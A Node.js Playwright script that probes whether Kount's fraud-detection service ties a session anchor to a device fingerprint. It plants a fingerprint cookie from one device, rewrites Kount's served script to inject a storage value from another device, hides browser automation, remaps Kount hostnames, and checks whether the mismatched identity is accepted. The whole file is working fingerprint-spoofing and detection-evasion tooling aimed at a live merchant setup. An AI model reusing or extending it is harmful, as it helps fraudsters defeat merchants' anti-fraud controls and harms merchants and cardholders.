#!/usr/bin/env node
/** knt-crosscheck.mjs — does Kount link the cross-session ss anchor to the FPCV?
 *  Present an FPCV from device A but an ss from a DIFFERENT device B (mismatch),
 *  and a run with an FPCV but a random ss. If accepted (200), no linkage. */
import { chromium } from 'playwright';
import http from 'node:http';
const TST={host:'tst.kaptcha.com',ip:'44.240.88.212'};
const MERCHANT='700000';
const FPCV='85c84560a8a0e45289b1bbe6a6b8b432711fa9fc467014b34f30360344148a5d1adc3f68f1109ea7f0243970fa703054681eacabed54910b6317164f4b51a7286a11639f380c87fd1d5eae67e1b6e19a99d3d58bf606013ab662fff5c65fb8b8d50457bf848b1b4d58c37216f9ff6eb9757e889b1918126fb181f02b82300dd7343cc9ff938b4062b3df745b40723636e8e01ad3ea70fdc5158ae9';
const SS_B='1746a9ea53124f74884c167d96a941c9';   // ss from a DIFFERENT device than the FPCV
const srv=http.createServer((q,s)=>{s.setHeader('Content-Type','text/html');s.end(`<!doctype html><html><body>
<script src="https://${TST.host}/collect/sdk?m=${MERCHANT}"></script>
<script>document.cookie='cdn.bluesnap.${MERCHANT}.ka.ck=${FPCV};path=/;SameSite=None;Secure';new ka.ClientSDK().collectData();</script>
</body></html>`);});
await new Promise(r=>srv.listen(0,'127.0.0.1',r));
const port=srv.address().port;
const b=await chromium.launch({headless:true,args:[`--host-resolver-rules=MAP ${TST.host} ${TST.ip}, MAP ssl.kaptcha.com 35.80.101.90, MAP kaptcha.com 35.80.101.90`,'--disable-blink-features=AutomationControlled']});
const ctx=await b.newContext({viewport:{width:1280,height:900}});const page=await ctx.newPage();
await page.route((u)=>/logo\.htm/.test(u.toString()),async(route)=>{const r=await route.fetch();let h=await r.text();h=h.replace("<script type='text/javascript'>",`<script type='text/javascript'>localStorage.setItem('ss','${SS_B}');`);await route.fulfill({response:r,body:h});});
const resp=[];page.on('response',r=>{if(/kaptcha/.test(r.url()))resp.push({s:r.status(),u:r.url().slice(0,90)});});
await page.goto(`http://127.0.0.1:${port}/`,{waitUntil:'domcontentloaded'});await page.waitForTimeout(24000);
try{await page.evaluate(()=>window.dispatchEvent(new Event('pagehide')));}catch(_){}
await page.waitForTimeout(1500);
console.log('FPCV = device A   ss = device B (mismatch)');
for(const r of resp)console.log(`  ${r.s} ${r.u}`);
console.log('all-200 =', resp.length>0 && resp.every(r=>r.s===200));
srv.close();await b.close();
